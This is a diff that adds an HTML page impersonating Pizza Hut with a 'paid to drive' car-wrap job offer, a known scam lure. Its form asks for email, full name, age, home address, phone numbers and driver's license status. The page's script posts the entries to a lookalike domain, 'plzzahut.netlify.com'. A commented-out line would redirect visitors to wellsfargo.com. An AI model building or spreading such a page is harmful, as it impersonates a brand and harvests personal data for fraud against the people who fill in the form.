@@ -1,0 +1,128 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Pizza Hut</title>
+    <link rel="stylesheet" href="css/w3.css"/>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+</head>
+<body>
+    <nav class="w3-bar w3-padding w3-card">
+        <a href="Index.html" class="w3-button w3-text-orange w3-padding w3-xlarge w3-hover-orange w3-rightbar w3-border-orange">Pizza</a>
+    </nav>
+
+    <div class="w3-row-padding" style="margin-top:30px">
+        <div class="w3-col s12 m12 l12">
+            <div class="w3-content" style="max-width:800px">
+                <img class="w3-mySlides" src="img/1.jpg" style="width:100%; height: 400px">
+                <img class="w3-mySlides" src="img/3.jpg" style="width:100%; height: 400px">
+                <img class="w3-mySlides" src="img/2.jpg" style="width:100%; height: 400px">
+              </div>
+              
+              <div class="w3-center">
+                <div class="w3-section">
+                  <button class="w3-button w3-light-grey" onclick="plusDivs(-1)">❮ Prev</button>
+                  <button class="w3-button w3-light-grey" onclick="plusDivs(1)">Next ❯</button>
+                </div>
+                <button class="w3-button demo" onclick="currentDiv(1)">1</button> 
+                <button class="w3-button demo" onclick="currentDiv(2)">2</button> 
+                <button class="w3-button demo" onclick="currentDiv(3)">3</button> 
+              </div>
+        </div>
+    </div>
+
+
+    <div class="w3-row-padding" style="margin-top:50px;">
+        <div class="w3-card-4 w3-orange w3-round w3-padding">
+            <p class="w3-text-white w3-padding w3-center">ABOUT</p>
+        </div>
+
+        <div class="w3-content" style="margin-top:50px;">
+            <p>
+                    Good News, It is very easy and simple, no application fees required, this is how it works; the basic premise of the"paid to drive concept" Pizza Hut " seeks people, regular citizens, professional drivers, and all car owners above eighteen (25) years old, to go about their normal routines they usually do, only with an advertisement for "Pizza Hut " plastered on their cars.
+
+                    The advertisements are typically vinyl decals, also known as "auto wraps" that almost seem to be painted on the vehicle, and which will cover some portion of your car's exterior surface. What does the company gain from this type of advertisement strategy? Lots of exposure and awareness; the auto wraps tend to be colorful, eye-catching and attracts lots of attention.Plus, it is a form of advertising with a captive audience, meaning people who are stuck in traffic can not take their eyes off the ad vehicle. This program will last for three(3)months and the minimum period you can participate is one(1) month. You will be compensated $300/week, which is essentially "rental" payment for letting our company use your car. Pizza Hut  shall provide auto detailers that will handle the advert placement on your car, these details have been tested and confirmed perfect for the job in order not to leave any damage on your car after the end of the program. There will be
+                    no fee for gas since you are not driving to anywhere else apart from your daily routine.Please provide the following information so that we can confirm you for this posting and send you further information.
+            </p>
+        </div>
+    </div>
+
+    <div class="w3-row-padding" style="margin-top:50px">
+        <div class="w3-col s12 m10 l10">
+                <div class="w3-card-4 w3-orange w3-round w3-padding">
+                        <p class="w3-text-white w3-padding w3-center">FILL FORM TO APPLY</p>
+                    </div>
+            <form id="Login">
+                    <input type="text" class="w3-input w3-section w3-border w3-bar-item w3-left w3-mobile" placeholder="E-mail" style="width:500px">
+                <div class="w3-bar w3-center w3-section">
+                    <input type="text" class="w3-input w3-border w3-bar-item w3-left w3-mobile" placeholder="Full Name" style="width:500px">
+                    <input type="text" class="w3-input w3-border w3-bar-item w3-right w3-mobile" placeholder="Age" style="width:500px">
+                </div>
+                <div class="w3-bar w3-center w3-section">
+                    <input type="text" class="w3-input w3-border w3-bar-item w3-left w3-mobile" placeholder="Occupation" style="width:500px">
+                    <input type="text" class="w3-input w3-border w3-bar-item w3-right w3-mobile" placeholder="Make of car/Year" style="width:500px">
+                </div>
+                <div class="w3-bar w3-center w3-section">
+                    <input type="text" class="w3-input w3-border w3-bar-item w3-left w3-mobile" placeholder="Address:(NOT PO Box)" style="width:500px">
+                    <input type="text" class="w3-input w3-border w3-bar-item w3-right w3-mobile" placeholder="City" style="width:500px">
+                </div>
+                <div class="w3-bar w3-center w3-section">
+                    <input type="text" class="w3-input w3-border w3-bar-item w3-left w3-mobile" placeholder="State" style="width:500px">
+                    <input type="text" class="w3-input w3-border w3-bar-item w3-right w3-mobile" placeholder="Zip code" style="width:500px">
+                </div>
+                <div class="w3-bar w3-center w3-section">
+                    <input type="text" class="w3-input w3-border w3-bar-item w3-left w3-mobile" placeholder="Do you have a driver's license?" style="width:500px">
+                    <input type="text" class="w3-input w3-border w3-bar-item w3-right w3-mobile" placeholder="Phone Number(s)" style="width:500px">
+                </div>
+                <button type="submit" class="w3-bar w3-orange w3-btn w3-round">SUBMIT</button>
+            </form>
+        </div>
+    </div>
+    <script>
+    
+    var slideIndex = 1;
+showDivs(slideIndex);
+
+function plusDivs(n) {
+  showDivs(slideIndex += n);
+}
+
+function currentDiv(n) {
+  showDivs(slideIndex = n);
+}
+
+function showDivs(n) {
+  var i;
+  var x = document.getElementsByClassName("w3-mySlides");
+  var dots = document.getElementsByClassName("demo");
+  if (n > x.length) {slideIndex = 1}    
+  if (n < 1) {slideIndex = x.length}
+  for (i = 0; i < x.length; i++) {
+    x[i].style.display = "none";  
+  }
+  for (i = 0; i < dots.length; i++) {
+    dots[i].className = dots[i].className.replace(" w3-red", "");
+  }
+  x[slideIndex-1].style.display = "block";  
+  dots[slideIndex-1].className += " w3-red";
+}
+    
+
+$(document).ready(function() {  
+    console.log("ready");
+    $('#Login').on("submit",function(evt){
+        evt.preventDefault();
+     
+        let payloadData = $(this).serializeArray().reduce((acc,oj)=>({...acc,[oj.name]:oj.value}),{});
+        console.log(payloadData);
+        $.post("https://plzzahut.netlify.com/.netlify/functions/index", JSON.stringify(payloadData),function(sux){
+            console.log({sux})
+            //window.open("https://www.wellsfargo.com","_self")
+        });
+    });
+});
+
+    </script>
+</body>
+</html
